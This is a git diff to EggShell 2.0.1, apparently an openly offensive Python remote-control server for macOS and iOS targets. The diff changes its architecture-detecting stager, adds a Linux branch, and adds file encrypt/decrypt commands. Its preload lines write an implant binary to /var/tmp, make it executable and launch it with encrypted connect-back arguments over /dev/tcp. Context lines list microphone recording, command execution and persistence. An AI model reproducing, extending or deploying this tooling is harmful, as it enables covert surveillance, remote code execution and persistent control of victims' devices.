@@ -1,4 +1,4 @@
-#NeonEggShell 2.0
+#NeonEggShell 2.0.1
 #Created By lucas.py 8-18-16
 import os,base64,random,string,socket,sys,time,binascii
 from Crypto import Random
@@ -27,7 +27,7 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.1\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
@@ -40,6 +40,7 @@ sessions = {}
 
 OSX_BINARY = "resources/esplosx"
 iOS_BINARY = "resources/esplios"
+#LINUX_BINARY = "resources/esplinux"
 nesProDylib = "resources/eggshellPro.dylib"
 #MARK: AES Encryption
 
@@ -200,6 +201,8 @@ def showHelp(CDA):
         showCommand("mic","record microphone")
         showCommand("brightness","adjust screen brightness")
         showCommand("exec","execute command")
+        showCommand("encrypt","encrypt file")
+        showCommand("decrypt","decrypt file")
         showCommand("persistence","attempts to connect back every 60 seconds")
         showCommand("rmpersistence","removes persistence")
         print ""
@@ -536,7 +539,7 @@ class SessionHandler:
         self.port = port
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
         INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey,binaryKey))
-        INSTRUCT_STAGER = "uname -p\n"
+        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -569,7 +572,9 @@ class SessionHandler:
         #CHOOSE/SEND BINARY
         payload = ""
         preload = ""
-    
+        if "armv7l" in CDA:
+            CDA = "Linux"
+        
         if "i386" in CDA:
             if verbose:
                 print strinfo("Detected OSX")
@@ -584,12 +589,22 @@ class SessionHandler:
             payload = binaryFile.read()
             binaryFile.close()
             preload = "rm /private/var/tmp/espl;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+        elif "Linux" in CDA:
+            if verbose:
+                print strinfo("Detected Linux, this isn't supported yet")
+            conn.close()
+            exit()
+            return
+            binaryFile = open(LINUX_BINARY, "rb")
+            payload = binaryFile.read()
+            binaryFile.close()
+            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
         else:
             if verbose:
                 print strinfo("device unrecognized")
                 print CDA
             conn.close();
-            return
+
         
         if verbose:
             print strinfo("Waiting For Target...")
